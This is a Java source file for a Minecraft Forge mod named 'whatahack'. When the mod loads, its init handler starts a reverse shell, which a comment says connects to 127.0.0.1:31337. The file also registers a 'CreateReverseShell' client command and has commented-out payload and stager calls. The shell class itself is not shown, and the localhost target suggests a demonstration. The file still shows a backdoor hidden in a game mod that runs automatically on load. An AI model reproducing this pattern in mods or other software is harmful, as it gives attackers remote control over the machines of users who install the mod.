package com.example.examplemod;

import cpw.mods.fml.common.Mod;
import cpw.mods.fml.common.Mod.EventHandler;
import cpw.mods.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.client.ClientCommandHandler;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
public class ExampleMod {
    public static final String MODID = "whatahack";
    public static final String VERSION = "0.1";


    @EventHandler
    public void init(FMLInitializationEvent event) {
        // Build-in reverse shell to 127.0.0.1:31337
        ReverseShell p = new ReverseShell();
        p.start();

        // Payload.Run();
        // Stager.start();

        System.out.println("Hacker Mode ENABLED");
        ClientCommandHandler.instance.registerCommand(new CommandUtils.TestPing());
        ClientCommandHandler.instance.registerCommand(new CommandUtils.CreateReverseShell());
    }

}